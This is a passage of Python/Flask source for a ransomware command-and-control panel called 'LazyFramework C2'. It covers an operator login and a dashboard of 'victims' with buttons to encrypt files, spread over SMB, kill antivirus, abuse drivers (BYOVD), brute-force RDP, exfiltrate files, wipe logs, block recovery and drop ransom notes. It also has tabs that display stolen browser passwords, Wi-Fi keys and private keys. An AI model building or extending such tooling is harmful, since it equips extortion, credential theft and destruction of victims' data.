        {% endif %}

        <form method="POST" action="/login" autocomplete="off">
            <div class="form-group">
                <label class="form-label">Username</label>
                <input type="text" name="username" class="form-input"
                       placeholder="Enter username" required autofocus
                       autocomplete="off" spellcheck="false">
            </div>
            <div class="form-group">
                <label class="form-label">Password</label>
                <input type="password" name="password" class="form-input"
                       placeholder="Enter password" required autocomplete="off">
            </div>
            <button type="submit" class="btn-login">🔓 Authenticate</button>
        </form>

        <div class="footer">
            LazyFramework C2 <span class="footer-dot">●</span> Session encrypted
        </div>
    </div>
</body>
</html>
            """

            # ═══ LOGIN ROUTES ═══
            @app.route("/login", methods=["GET", "POST"])
            def login():
                ip = request.remote_addr or "unknown"
                allowed, remaining = _check_rate_limit(ip)
                if not allowed:
                    if request.method == "POST":
                        _record_attempt(ip, False)
                    return (
                        render_template_string(
                            LOGIN_TEMPLATE, error=None, locked=True, remaining=remaining
                        ),
                        429,
                    )

                if request.method == "POST":
                    username = request.form.get("username", "").strip()
                    password = request.form.get("password", "")

                    if username == _ADMIN_USERNAME and _verify_password(
                        password, _ADMIN_PASSWORD_HASH
                    ):
                        _record_attempt(ip, True)
                        session["logged_in"] = True
                        session["username"] = username
                        session["login_time"] = time.time()
                        session["ip"] = ip
                        session.permanent = True
                        print(f"[+] Web login success: {username}@{ip}")
                        self._log_access(f"LOGIN_SUCCESS user={username} ip={ip}")
                        next_url = request.args.get("next", "/")
                        if not next_url.startswith("/"):
                            next_url = "/"
                        return redirect(next_url)
                    else:
                        _record_attempt(ip, False)
                        print(f"[!] Web login FAILED: {username}@{ip}")
                        self._log_access(f"LOGIN_FAILED user={username} ip={ip}")
                        return (
                            render_template_string(
                                LOGIN_TEMPLATE,
                                error="Invalid username or password",
                                locked=False,
                                remaining=0,
                            ),
                            401,
                        )

                if session.get("logged_in"):
                    return redirect("/")
                return render_template_string(
                    LOGIN_TEMPLATE, error=None, locked=False, remaining=0
                )

            @app.route("/logout")
            def logout():
                username = session.get("username", "?")
                ip = request.remote_addr or "?"
                session.clear()
                print(f"[*] Web logout: {username}@{ip}")
                self._log_access(f"LOGOUT user={username} ip={ip}")
                return redirect("/login")

            @app.before_request
            def _check_auth():
                PUBLIC_ROUTES = {"/login", "/logout"}
                if request.path in PUBLIC_ROUTES:
                    return None

                if not session.get("logged_in"):
                    if request.is_json or request.path.startswith("/api"):
                        return (
                            jsonify(
                                {"success": False, "error": "authentication_required"}
                            ),
                            401,
                        )
                    return redirect(url_for("login", next=request.path))

                login_time = session.get("login_time", 0)
                if time.time() - login_time > 3600:
                    session.clear()
                    if request.is_json or request.path.startswith("/api"):
                        return (
                            jsonify({"success": False, "error": "session_expired"}),
                            401,
                        )
                    return redirect(url_for("login"))
                return None

            # ═══ MAIN HTML TEMPLATE ═══
            HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>LazyFramework C2 Panel v6.3</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root {
            --bg-primary: #0a0e14;
            --bg-secondary: #0d1117;
            --bg-tertiary: #161b22;
            --bg-hover: #1c2128;
            --border: #30363d;
            --border-accent: #58a6ff;
            --text-primary: #e6edf3;
            --text-secondary: #8b949e;
            --text-muted: #6e7681;
            --accent-green: #3fb950;
            --accent-red: #f85149;
            --accent-yellow: #d29922;
            --accent-blue: #58a6ff;
            --accent-purple: #bc8cff;
            --accent-cyan: #39c5cf;
            --accent-pink: #f778ba;
            --accent-orange: #ff8c42;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: var(--bg-primary);
            color: var(--text-primary);
            min-height: 100vh;
            font-size: 13px;
            line-height: 1.5;
        }
        .header {
            background: linear-gradient(180deg, #161b22 0%, #0d1117 100%);
            border-bottom: 1px solid var(--border);
            padding: 16px 24px;
            position: sticky;
            top: 0;
            z-index: 100;
        }
        .header-content {
            display: flex;
            align-items: center;
            justify-content: space-between;
            max-width: 1800px;
            margin: 0 auto;
        }
        .logo { display: flex; align-items: center; gap: 12px; }
        .logo-icon {
            width: 32px;
            height: 32px;
            background: linear-gradient(135deg, var(--accent-red), var(--accent-orange));
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
            box-shadow: 0 0 20px rgba(248, 81, 73, 0.3);
        }
        .logo-text { font-size: 16px; font-weight: 600; letter-spacing: -0.5px; }
        .logo-sub { font-size: 11px; color: var(--text-muted); font-weight: 400; }
        .hybrid-badge {
            display: inline-block;
            padding: 2px 8px;
            background: rgba(0, 255, 0, 0.15);
            color: var(--accent-green);
            border: 1px solid var(--accent-green);
            border-radius: 10px;
            font-size: 10px;
            font-weight: 600;
            margin-left: 8px;
        }
        .header-status { display: flex; align-items: center; gap: 20px; font-size: 12px; }
        .status-item { display: flex; align-items: center; gap: 6px; color: var(--text-secondary); }
        .status-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: var(--accent-green);
            box-shadow: 0 0 8px var(--accent-green);
            animation: pulse 2s infinite;
        }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        .container { max-width: 1800px; margin: 0 auto; padding: 24px; }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 12px;
            margin-bottom: 24px;
        }
        .stat-card {
            background: var(--bg-secondary);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 16px 20px;
            transition: all 0.2s;
            position: relative;
            overflow: hidden;
        }
        .stat-card::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0;
            height: 2px;
            background: var(--accent-blue);
        }
        .stat-card:hover { border-color: var(--border-accent); transform: translateY(-2px); }
        .stat-card.green::before { background: var(--accent-green); }
        .stat-card.red::before { background: var(--accent-red); }
        .stat-card.yellow::before { background: var(--accent-yellow); }
        .stat-card.purple::before { background: var(--accent-purple); }
        .stat-card.pink::before { background: var(--accent-pink); }
        .stat-card.cyan::before { background: var(--accent-cyan); }
        .stat-label {
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: var(--text-muted);
            margin-bottom: 8px;
            font-weight: 500;
        }
        .stat-value {
            font-size: 28px;
            font-weight: 600;
            letter-spacing: -1px;
            color: var(--text-primary);
        }
        .stat-card.green .stat-value { color: var(--accent-green); }
        .stat-card.red .stat-value { color: var(--accent-red); }
        .stat-card.yellow .stat-value { color: var(--accent-yellow); }
        .stat-card.purple .stat-value { color: var(--accent-purple); }
        .stat-card.pink .stat-value { color: var(--accent-pink); }
        .stat-card.cyan .stat-value { color: var(--accent-cyan); }
        .bulk-actions {
            background: var(--bg-secondary);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 16px 20px;
            margin-bottom: 24px;
        }
        .bulk-title {
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: var(--text-muted);
            margin-bottom: 12px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .bulk-buttons { display: flex; flex-wrap: wrap; gap: 8px; }
        .btn {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            padding: 6px 12px;
            font-size: 12px;
            font-weight: 500;
            border: 1px solid var(--border);
            background: var(--bg-tertiary);
            color: var(--text-primary);
            border-radius: 6px;
            cursor: pointer;
            transition: all 0.15s;
            font-family: inherit;
            white-space: nowrap;
            text-decoration: none;
        }
        .btn:hover { background: var(--bg-hover); border-color: var(--text-secondary); transform: translateY(-1px); }
        .btn-primary { background: #1f6feb; border-color: #1f6feb; color: white; }
        .btn-primary:hover { background: #388bfd; border-color: #388bfd; }
        .btn-danger { background: #da3633; border-color: #da3633; color: white; }
        .btn-danger:hover { background: #f85149; border-color: #f85149; }
        .btn-warning { background: #9e6a03; border-color: #9e6a03; color: white; }
        .btn-warning:hover { background: #d29922; border-color: #d29922; }
        .btn-success { background: #238636; border-color: #238636; color: white; }
        .btn-success:hover { background: #2ea043; border-color: #2ea043; }
        .btn-purple { background: #6e40c9; border-color: #6e40c9; color: white; }
        .btn-purple:hover { background: #8957e5; border-color: #8957e5; }
        .btn-sm { padding: 4px 8px; font-size: 11px; }
        .section-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 12px;
        }
        .section-title {
            font-size: 15px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .section-count {
            font-size: 12px;
            color: var(--text-muted);
            background: var(--bg-tertiary);
            padding: 2px 8px;
            border-radius: 10px;
            font-weight: 500;
        }
        .victim-card {
            background: var(--bg-secondary);
            border: 1px solid var(--border);
            border-radius: 8px;
            margin-bottom: 12px;
            overflow: hidden;
            transition: all 0.2s;
        }
        .victim-card:hover { border-color: var(--border-accent); }
        .victim-card.hybrid { border-left: 3px solid var(--accent-green); }
        .victim-card.legacy { border-left: 3px solid var(--accent-yellow); }
        .victim-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 14px 20px;
            background: var(--bg-tertiary);
            cursor: pointer;
            user-select: none;
        }
        .victim-header:hover { background: var(--bg-hover); }
        .victim-info { display: flex; align-items: center; gap: 16px; flex: 1; }
        .victim-os-icon {
            font-size: 22px;
            width: 40px;
            height: 40px;
            background: var(--bg-secondary);
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 1px solid var(--border);
        }
        .victim-name { font-size: 14px; font-weight: 600; color: var(--text-primary); }
        .victim-id {
            font-size: 11px;
            color: var(--text-muted);
            font-family: 'SF Mono', Monaco, Consolas, monospace;
        }
        .victim-victim-id {
            color: var(--accent-cyan);
            font-family: 'SF Mono', Monaco, Consolas, monospace;
            font-size: 10px;
        }
        .victim-meta { display: flex; align-items: center; gap: 12px; font-size: 12px; color: var(--text-secondary); }
        .badge {
            display: inline-flex;
            align-items: center;
            gap: 4px;
            padding: 3px 8px;
            font-size: 11px;
            font-weight: 500;
            border-radius: 12px;
            border: 1px solid var(--border);
        }
        .badge-admin { background: rgba(63, 185, 80, 0.15); color: var(--accent-green); border-color: rgba(63, 185, 80, 0.3); }
        .badge-user { background: rgba(139, 148, 158, 0.15); color: var(--text-secondary); }
        .badge-encrypted { background: rgba(248, 81, 73, 0.15); color: var(--accent-red); border-color: rgba(248, 81, 73, 0.3); }
        .badge-byovd { background: rgba(255, 140, 66, 0.15); color: var(--accent-orange); border-color: rgba(255, 140, 66, 0.3); }
        .badge-smb { background: rgba(188, 140, 255, 0.15); color: var(--accent-purple); border-color: rgba(188, 140, 255, 0.3); }
        .badge-av { background: rgba(247, 120, 186, 0.15); color: var(--accent-pink); border-color: rgba(247, 120, 186, 0.3); }
        .badge-hybrid { background: rgba(0, 255, 0, 0.15); color: #00ff00; border-color: #00ff00; font-weight: bold; }
        .badge-legacy { background: rgba(255, 170, 0, 0.15); color: #ffaa00; border-color: #ffaa00; }
        .badge-creds { background: rgba(255, 200, 0, 0.15); color: #ffc800; border-color: #ffc800; font-weight: bold; }
        .badge-registering { background: rgba(255, 170, 0, 0.15); color: #ffaa00; border-color: #ffaa00; }
        .badge-status { background: var(--bg-tertiary); }
        .status-registered { color: var(--accent-cyan); }
        .status-active { color: var(--accent-green); }
        .status-encrypted { color: var(--accent-red); }
        .status-decrypted { color: var(--accent-green); }
        .status-disconnected { color: var(--text-muted); }
        .status-killed { color: var(--accent-purple); }
        .status-connected { color: var(--accent-yellow); }
        .victim-body {
            padding: 16px 20px;
            border-top: 1px solid var(--border);
            display: none;
        }
        .victim-card.expanded .victim-body {
            display: block;
            animation: slideDown 0.2s ease-out;
        }
        @keyframes slideDown {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .victim-details {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
            gap: 12px;
            margin-bottom: 16px;
            padding: 12px;
            background: var(--bg-primary);
            border-radius: 6px;
            border: 1px solid var(--border);
        }
        .detail-item { font-size: 12px; }
        .detail-label {
            color: var(--text-muted);
            font-size: 10px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 2px;
        }
        .detail-value {
            color: var(--text-primary);
            font-family: 'SF Mono', Monaco, Consolas, monospace;
            font-size: 12px;
            word-break: break-all;
        }
        .detail-value.key {
            color: var(--accent-green);
            background: rgba(63, 185, 80, 0.1);
            padding: 4px 8px;
            border-radius: 4px;
            border: 1px solid rgba(63, 185, 80, 0.3);
            cursor: pointer;
        }
        .detail-value.hybrid-key {
            color: #00ff00;
            background: rgba(0, 255, 0, 0.1);
            padding: 4px 8px;
            border-radius: 4px;
            border: 1px solid #00ff00;
            cursor: pointer;
            font-weight: bold;
        }
        .hybrid-warning {
            background: rgba(0, 255, 0, 0.05);
            border: 1px solid rgba(0, 255, 0, 0.3);
            border-radius: 6px;
            padding: 12px;
            margin-bottom: 12px;
            color: #00ff00;
            font-size: 12px;
        }
        .actions-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
            gap: 8px;
        }
        .action-group { margin-bottom: 12px; }
        .action-group-title {
            font-size: 10px;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: var(--text-muted);
            margin-bottom: 8px;
            font-weight: 600;
        }
        .tabs {
            display: flex;
            gap: 4px;
            margin-bottom: 16px;
            border-bottom: 1px solid var(--border);
            overflow-x: auto;
        }
        .tab-btn {
            padding: 8px 16px;
            font-size: 13px;
            font-weight: 500;
            background: transparent;
            border: none;
            border-bottom: 2px solid transparent;
            color: var(--text-secondary);
            cursor: pointer;
            transition: all 0.15s;
            font-family: inherit;
            white-space: nowrap;
        }
        .tab-btn:hover { color: var(--text-primary); }
        .tab-btn.active { color: var(--accent-blue); border-bottom-color: var(--accent-blue); }
        .tab-content { display: none; }
        .tab-content.active { display: block; animation: fadeIn 0.2s; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .exfil-toolbar {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 16px;
            padding: 12px 16px;
            background: var(--bg-secondary);
            border: 1px solid var(--border);
            border-radius: 8px;
            flex-wrap: wrap;
            gap: 12px;
        }
        .exfil-stats { display: flex; gap: 24px; font-size: 12px; flex-wrap: wrap; }
        .exfil-stat-item { display: flex; align-items: center; gap: 6px; color: var(--text-secondary); }
        .exfil-stat-value { color: var(--text-primary); font-weight: 600; }
        .exfil-victim {
            background: var(--bg-secondary);
            border: 1px solid var(--border);
            border-radius: 8px;
            margin-bottom: 12px;
            overflow: hidden;
        }
        .exfil-victim-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 12px 16px;
            background: var(--bg-tertiary);
            border-bottom: 1px solid var(--border);
        }
        .exfil-victim-name {
            font-size: 13px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .exfil-victim-count {
            font-size: 11px;
            color: var(--text-muted);
            background: var(--bg-secondary);
            padding: 2px 8px;
            border-radius: 10px;
            border: 1px solid var(--border);
        }
        .exfil-files-list { padding: 8px; }
        .exfil-file-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 10px 12px;
            border-radius: 6px;
            transition: background 0.15s;
            gap: 12px;
        }
        .exfil-file-row:hover { background: var(--bg-hover); }
        .exfil-file-info { display: flex; align-items: center; gap: 12px; flex: 1; min-width: 0; }
        .exfil-file-icon {
            font-size: 16px;
            width: 32px;
            height: 32px;
            background: var(--bg-tertiary);
            border-radius: 6px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
        }
        .exfil-file-details { min-width: 0; flex: 1; }
        .exfil-file-name {
            font-size: 13px;
            color: var(--text-primary);
            font-weight: 500;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        .exfil-file-meta {
            font-size: 11px;
            color: var(--text-muted);
            display: flex;
            gap: 12px;
            margin-top: 2px;
        }
        .exfil-file-actions { display: flex; gap: 6px; flex-shrink: 0; }
        .history-list {
            background: var(--bg-secondary);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 8px;
            max-height: 600px;
            overflow-y: auto;
        }
        .history-item {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 8px 12px;
            border-radius: 6px;
            font-size: 12px;
            transition: background 0.15s;
        }
        .history-item:hover { background: var(--bg-hover); }
        .history-time {
            color: var(--text-muted);
            font-family: 'SF Mono', Monaco, Consolas, monospace;
            font-size: 11px;
            min-width: 140px;
        }
        .history-victim {
            color: var(--accent-yellow);
            font-family: 'SF Mono', Monaco, Consolas, monospace;
            font-size: 11px;
            min-width: 80px;
        }
        .history-command { color: var(--accent-cyan); font-weight: 500; flex: 1; }
        .history-status { color: var(--accent-green); font-size: 11px; }
        .empty-state { text-align: center; padding: 60px 20px; color: var(--text-muted); }
        .empty-icon { font-size: 48px; margin-bottom: 12px; opacity: 0.5; }
        .empty-title { font-size: 15px; font-weight: 600; margin-bottom: 4px; color: var(--text-secondary); }
        .empty-desc { font-size: 12px; }
        .creds-section {
            padding: 12px;
            border-bottom: 1px solid var(--border);
        }
        .creds-section:last-child { border-bottom: none; }
        .creds-section-title {
            color: var(--accent-blue);
            font-weight: 600;
            font-size: 12px;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .cred-row {
            display: grid;
            gap: 8px;
            padding: 6px 8px;
            border-radius: 4px;
            font-size: 12px;
            background: var(--bg-tertiary);
            margin: 4px 0;
        }
        .cred-row.browser {
            grid-template-columns: 80px 1fr 150px 200px;
        }
        .cred-row.wifi {
            grid-template-columns: 1fr 1fr;
        }
        .cred-browser { color: var(--accent-cyan); font-weight: 500; }
        .cred-url { color: var(--text-secondary); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
        .cred-username { color: var(--accent-yellow); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
        .cred-password {
            color: var(--accent-green);
            font-family: 'SF Mono', Monaco, Consolas, monospace;
            cursor: pointer;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        .cred-password:hover { color: #00ff00; text-decoration: underline; }
        .cred-key-block {
            padding: 8px;
            border-radius: 4px;
            font-size: 11px;
            background: var(--bg-tertiary);
            margin: 4px 0;
        }
        .cred-key-title {
            color: var(--accent-yellow);
            font-weight: 600;
            margin-bottom: 4px;
        }
        .cred-key-content {
            color: var(--accent-green);
            font-family: 'SF Mono', Monaco, Consolas, monospace;
            font-size: 10px;
            white-space: pre-wrap;
            word-break: break-all;
            max-height: 120px;
            overflow: auto;
            background: var(--bg-primary);
            padding: 6px;
            border-radius: 3px;
        }
        .postex-card {
            background: var(--bg-secondary);
            border: 1px solid var(--border);
            border-radius: 8px;
            margin-bottom: 12px;
            overflow: hidden;
        }
        .postex-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 12px;
            padding: 12px;
        }
        .postex-stat {
            background: var(--bg-tertiary);
            padding: 10px;
            border-radius: 6px;
        }
        .postex-stat-label {
            font-size: 10px;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .postex-stat-value {
            font-size: 20px;
            font-weight: 600;
            margin-top: 2px;
        }
        .postex-info {
            padding: 12px;
            background: var(--bg-tertiary);
            margin: 8px;
            border-radius: 6px;
            font-size: 11px;
            color: var(--text-secondary);
            line-height: 1.8;
        }
        .postex-info strong { color: var(--text-primary); }
        ::-webkit-scrollbar { width: 8px; height: 8px; }
        ::-webkit-scrollbar-track { background: var(--bg-primary); }
        ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: var(--text-muted); }
        @media (max-width: 768px) {
            .header-content { flex-direction: column; gap: 12px; align-items: flex-start; }
            .header-status { flex-wrap: wrap; gap: 12px; }
            .stats-grid { grid-template-columns: repeat(2, 1fr); }
            .victim-meta { display: none; }
            .container { padding: 12px; }
            .cred-row.browser { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <header class="header">
        <div class="header-content">
            <div class="logo">
                <div class="logo-icon">☠</div>
                <div>
                    <div class="logo-text">
                        LazyFramework C2
                        <span class="hybrid-badge">HYBRID v6.3</span>
                    </div>
                    <div class="logo-sub">Command & Control Server</div>
                </div>
            </div>
            <div class="header-status">
                <div class="status-item">
                    <span class="status-dot"></span>
                    <span>Online</span>
                </div>
                <div class="status-item">
                    <span>🔒</span>
                    <span>{{ total_count }} victims</span>
                </div>
                <div class="status-item">
                    <span>🔑</span>
                    <span>{{ hybrid_count }} hybrid</span>
                </div>
                <div class="status-item" style="border-left: 1px solid #30363d; padding-left: 20px;">
                    <span>👤</span>
                    <span>{{ session_username }}</span>
                </div>
                <a href="/logout" class="btn btn-sm btn-danger">🚪 Logout</a>
            </div>
        </div>
    </header>

    <div class="container">
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-label">Total Victims</div>
                <div class="stat-value">{{ total_count }}</div>
            </div>
            <div class="stat-card green">
                <div class="stat-label">Online</div>
                <div class="stat-value">{{ online_count }}</div>
            </div>
            <div class="stat-card yellow">
                <div class="stat-label">Admin/SYSTEM</div>
                <div class="stat-value">{{ admin_count }}</div>
            </div>
            <div class="stat-card cyan">
                <div class="stat-label">Hybrid Mode</div>
                <div class="stat-value">{{ hybrid_count }}</div>
            </div>
            <div class="stat-card red">
                <div class="stat-label">Encrypted</div>
                <div class="stat-value">{{ encrypted_count }}</div>
            </div>
            <div class="stat-card pink">
                <div class="stat-label">Credentials</div>
                <div class="stat-value">{{ total_creds }}</div>
            </div>
        </div>

        <div class="tabs">
            <button class="tab-btn active" onclick="switchTab('victims')" id="tab-victims">
                🎯 Victims
            </button>
            <button class="tab-btn" onclick="switchTab('creds')" id="tab-creds">
                🔑 Credentials
            </button>
            <button class="tab-btn" onclick="switchTab('postex')" id="tab-postex">
                🎯 Post-Exploit
            </button>
            <button class="tab-btn" onclick="switchTab('exfil')" id="tab-exfil">
                📤 Exfiltrated Files
            </button>
            <button class="tab-btn" onclick="switchTab('history')" id="tab-history">
                📜 History
            </button>
        </div>

        <div class="tab-content active" id="content-victims">
            <div class="bulk-actions">
                <div class="bulk-title">
                    <span>⚡</span>
                    <span>Bulk Actions (All Victims)</span>
                </div>
                <div class="bulk-buttons">
                    <button class="btn btn-sm" onclick="bulkCommand('status')">📊 Status</button>
                    <button class="btn btn-sm" onclick="bulkCommand('ping')">🏓 Ping</button>
                    <button class="btn btn-sm btn-purple" onclick="bulkCommand('byovd')">🔧 BYOVD</button>
                    <button class="btn btn-sm btn-purple" onclick="bulkCommand('spread')">🌐 Spread</button>
                    <button class="btn btn-sm btn-warning" onclick="bulkCommand('av_kill')">☠ AV Kill</button>
                    <button class="btn btn-sm btn-primary" onclick="bulkCommand('show_gui')">🖥️ Show GUI</button>
                    <button class="btn btn-sm btn-primary" onclick="bulkCommand('decrypt_gui')">🔓 Decrypt GUI</button>
                    <button class="btn btn-sm btn-purple" onclick="bulkCommand('exfiltrate')">📤 Exfiltrate</button>
                    <button class="btn btn-sm btn-warning" onclick="bulkCommand('wipe_logs')">🧹 Wipe Logs</button>
                    <button class="btn btn-sm btn-warning" onclick="bulkCommand('anti_recovery')">🔄 Anti-Recovery</button>
                    <button class="btn btn-sm btn-danger" onclick="if(confirm('⚠️ Encrypt ALL victims?'))bulkCommand('encrypt')">🔒 Encrypt All</button>
                </div>
            </div>

            <div class="section-header">
                <div class="section-title">
                    <span>🎯</span>
                    <span>Connected Victims</span>
                    <span class="section-count">{{ total_count }}</span>
                </div>
                <button class="btn btn-sm" onclick="location.reload()">🔄 Refresh</button>
            </div>

            {% if victims %}
                {% for id, data in victims.items() %}
                <div class="victim-card {{ 'hybrid' if data.encryption_mode == 'hybrid' else 'legacy' if data.encryption_mode == 'legacy' else '' }}" id="victim-{{ id }}">
                    <div class="victim-header" onclick="toggleVictim('{{ id }}')">
                        <div class="victim-info">
                            <div class="victim-os-icon">
                                {% if data.os == 'windows' %}🪟
                                {% elif data.os == 'linux' %}🐧
                                {% elif data.os == 'macos' %}🍎
                                {% else %}💻{% endif %}
                            </div>
                            <div>
                                <div class="victim-name">{{ data.hostname }}</div>
                                <div class="victim-id">{{ id }} • {{ data.ip }}:{{ data.port }}</div>
                                {% if data.victim_id %}
                                <div class="victim-victim-id">🆔 {{ data.victim_id }}</div>
                                {% endif %}
                            </div>
                        </div>
                        <div class="victim-meta">
                            {% if not data.registered %}
                            <span class="badge badge-registering">⏳ Registering</span>
                            {% else %}
                                {% if data.encryption_mode == 'hybrid' %}
                                <span class="badge badge-hybrid">🔐 HYBRID</span>
                                {% elif data.encryption_mode == 'legacy' %}
                                <span class="badge badge-legacy">🔓 Legacy</span>
                                {% endif %}

                                {% if data.is_admin %}
                                <span class="badge badge-admin">✅ Admin</span>
                                {% else %}
                                <span class="badge badge-user">👤 User</span>
                                {% endif %}

                                {% if data.creds_count > 0 %}
                                <span class="badge badge-creds">🔑 {{ data.creds_count }}</span>
                                {% endif %}

                                {% if data.byovd_enabled %}<span class="badge badge-byovd">BYOVD</span>{% endif %}
                                {% if data.smb_worm_enabled %}<span class="badge badge-smb">SMB</span>{% endif %}
                                {% if data.av_bypass %}<span class="badge badge-av">AV</span>{% endif %}

                                {% if data.encrypted %}
                                <span class="badge badge-encrypted">🔒 {{ data.encrypted_count }}</span>
                                {% endif %}

                                {% if data.exfiltrated_count > 0 %}
                                <span class="badge badge-smb">📤 {{ data.exfiltrated_count }}</span>
                                {% endif %}
                            {% endif %}

                            <span class="badge badge-status status-{{ data.status }}">
                                ● {{ data.status }}
                            </span>
                        </div>
                    </div>

                    <div class="victim-body">
                        {% if not data.registered %}
                        <div class="hybrid-warning" style="background: rgba(255,170,0,0.05); border-color: rgba(255,170,0,0.3); color: #ffaa00;">
                            <strong>⏳ Waiting for register...</strong><br>
                            Victim accepted connection but belum mengirim register data.
                            Tunggu beberapa detik lalu refresh.
                        </div>
                        {% else %}
                            {% if data.encryption_mode == 'hybrid' %}
                            <div class="hybrid-warning">
                                <strong>🔐 HYBRID MODE (RSA-4096 + AES-256-GCM)</strong><br>
                                Decrypt requires the RSA <strong>private key</strong>.<br>
                                <strong>Victim ID:</strong> <code>{{ data.victim_id or 'N/A' }}</code> •
                                <strong>Key Fingerprint:</strong> <code>{{ data.key_fingerprint or 'N/A' }}</code>
                            </div>
                            {% endif %}

                            <div class="victim-details">
                                <div class="detail-item">
                                    <div class="detail-label">User</div>
                                    <div class="detail-value">{{ data.user }}</div>
                                </div>
                                <div class="detail-item">
                                    <div class="detail-label">OS</div>
                                    <div class="detail-value">{{ data.os }}</div>
                                </div>
                                <div class="detail-item">
                                    <div class="detail-label">Encryption</div>
                                    <div class="detail-value">{{ data.encryption or 'N/A' }}</div>
                                </div>
                                <div class="detail-item">
                                    <div class="detail-label">Last Seen</div>
                                    <div class="detail-value">{{ data.last_seen }}</div>
                                </div>

                                {% if data.victim_id %}
                                <div class="detail-item">
                                    <div class="detail-label">🆔 Victim ID</div>
                                    <div class="detail-value hybrid-key" onclick="copyText('{{ data.victim_id }}')">
                                        {{ data.victim_id }}
                                    </div>
                                </div>
                                {% endif %}

                                {% if data.key_fingerprint %}
                                <div class="detail-item">
                                    <div class="detail-label">🔑 Key Fingerprint</div>
                                    <div class="detail-value hybrid-key" onclick="copyText('{{ data.key_fingerprint }}')">
                                        {{ data.key_fingerprint }}
                                    </div>
                                </div>
                                {% endif %}
                            </div>

                            <div class="action-group">
                                <div class="action-group-title">🔒 Encryption</div>
                                <div class="actions-grid">
                                    <button class="btn btn-sm btn-danger" onclick="sendCmd('{{ id }}', 'encrypt')">🔒 Encrypt</button>
                                    {% if data.encryption_mode != 'hybrid' %}
                                    <button class="btn btn-sm btn-success" onclick="sendCmd('{{ id }}', 'decrypt')">🔓 Decrypt</button>
                                    {% else %}
                                    <button class="btn btn-sm" disabled>🔓 Decrypt (N/A)</button>
                                    {% endif %}
                                    <button class="btn btn-sm btn-primary" onclick="sendCmd('{{ id }}', 'show_gui')">🖥️ Show GUI</button>
                                    <button class="btn btn-sm btn-primary" onclick="sendCmd('{{ id }}', 'decrypt_gui')">🔓 Decrypt GUI</button>
                                </div>
                            </div>

                            <div class="action-group">
                                <div class="action-group-title">📊 Information</div>
                                <div class="actions-grid">
                                    <button class="btn btn-sm" onclick="sendCmd('{{ id }}', 'status')">📊 Status</button>
                                    <button class="btn btn-sm" onclick="sendCmd('{{ id }}', 'ping')">🏓 Ping</button>
                                    <button class="btn btn-sm btn-primary" onclick="sendCmd('{{ id }}', 'note')">📝 Drop Note</button>
                                    <button class="btn btn-sm btn-primary" onclick="sendCmd('{{ id }}', 'wallpaper')">🖼️ Wallpaper</button>
                                </div>
                            </div>

                            <div class="action-group">
                                <div class="action-group-title">⚔️ Attack</div>
                                <div class="actions-grid">
                                    <button class="btn btn-sm btn-purple" onclick="sendCmd('{{ id }}', 'byovd')">🔧 BYOVD</button>
                                    <button class="btn btn-sm btn-purple" onclick="sendCmd('{{ id }}', 'spread')">🌐 SMB Spread</button>
                                    <button class="btn btn-sm btn-warning" onclick="sendCmd('{{ id }}', 'av_kill')">☠ AV Killer</button>
                                    <button class="btn btn-sm btn-warning" onclick="sendCmd('{{ id }}', 'rdp_enable')">🖥️ Enable RDP</button>
                                    <button class="btn btn-sm btn-danger" onclick="openBruteforceDialog('{{ id }}')">🔐 Bruteforce RDP</button>
                                </div>
                            </div>

                            <div class="action-group">
                                <div class="action-group-title">🧹 Cleanup & Exfil</div>
                                <div class="actions-grid">
                                    <button class="btn btn-sm btn-purple" onclick="sendCmd('{{ id }}', 'exfiltrate')">📤 Exfiltrate</button>
                                    <button class="btn btn-sm btn-warning" onclick="sendCmd('{{ id }}', 'wipe_logs')">🧹 Wipe Logs</button>
